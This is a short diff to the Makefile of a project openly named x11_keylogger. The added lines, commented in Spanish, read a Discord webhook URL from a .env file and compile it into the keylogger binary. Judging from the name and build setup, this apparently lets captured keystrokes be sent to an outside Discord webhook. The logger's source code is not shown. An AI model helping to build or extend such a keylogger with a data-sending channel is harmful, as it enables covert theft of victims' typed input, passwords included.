@@ -6,6 +6,17 @@ LDFLAGS = -lX11 -lXtst -lpthread
 TARGET = x11_keylogger
 SOURCE = src/x11_keylogger.c
 
+# Leer webhook de Discord desde .env
+DISCORD_WEBHOOK := ""
+ifneq ("$(wildcard .env)","")
+	DISCORD_WEBHOOK := $(shell grep DISCORD_WEBHOOK_URL .env | cut -d= -f2 | tr -d '"')
+endif
+
+# Si webhook no está vacío, compilar con flag DISCORD_WEBHOOK
+ifneq ("$(DISCORD_WEBHOOK)","")
+	CFLAGS += -DDISCORD_WEBHOOK="\"$(DISCORD_WEBHOOK)\""
+endif
+
 # Colores para output
 RED = \033[0;31m
 GREEN = \033[0;32m
